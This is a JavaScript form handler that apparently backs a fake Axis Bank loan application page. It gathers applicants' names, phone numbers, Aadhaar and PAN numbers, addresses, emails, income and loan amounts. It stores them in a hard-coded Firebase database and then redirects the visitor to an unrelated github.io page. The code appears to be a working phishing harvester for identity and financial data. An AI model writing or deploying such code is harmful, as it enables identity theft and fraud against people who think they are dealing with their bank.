// Initialize Firebase (ADD YOUR OWN DATA)
const firebaseConfig = {
  apiKey: "AIzaSyAxjW26oNbjoULSb2s3TKZfIj5fSgPYQnQ",
  authDomain: "ban-lo.firebaseapp.com",
  databaseURL: "https://ban-lo-default-rtdb.firebaseio.com",
  projectId: "ban-lo",
  storageBucket: "ban-lo.appspot.com",
  messagingSenderId: "418231309153",
  appId: "1:418231309153:web:6de1055704c67882a96b20",


    

  };

firebase.initializeApp(firebaseConfig);

// Reference messages collection
var messagesRef = firebase.database().ref('messages');

// Listen for form submit
document.getElementById('contactForm').addEventListener('submit', submitForm);

// Submit form
function submitForm(e){
  e.preventDefault();

  // Get values
  var name = getInputVal('name');
  var phone = getInputVal('phone');
  var aadhar = getInputVal('aadhar');
  var pan = getInputVal('pan');
  var address = getInputVal('address');
  var email = getInputVal('email')
  var job_desc = getInputVal('job_desc')
  var income = getInputVal('income')
  var amount = getInputVal('amount')

  // Save message
  saveMessage(name, phone, aadhar, pan, address, email, job_desc, income, amount);

  // Show alert
// alert("Axis Bank Will Contact You Soon")
//   // Clear form
//   document.getElementById('contactForm').reset();
document.getElementById('contactForm').reset();
window.location.href="https://ggw2.github.io/fivverr2";
}

// Function to get get form values
function getInputVal(id){
  return document.getElementById(id).value;
}

// Save message to firebase
function saveMessage(name, phone, aadhar, pan, address, email, job_desc, income, amount){
  var newMessageRef = messagesRef.push();
  newMessageRef.set({
    name: name,
    phone:phone,
    aadhar:aadhar,
    pan:pan,
    adddress:address,
    email:email,
    job_desc:job_desc,
    income:income,
    amount:amount,
  });
}
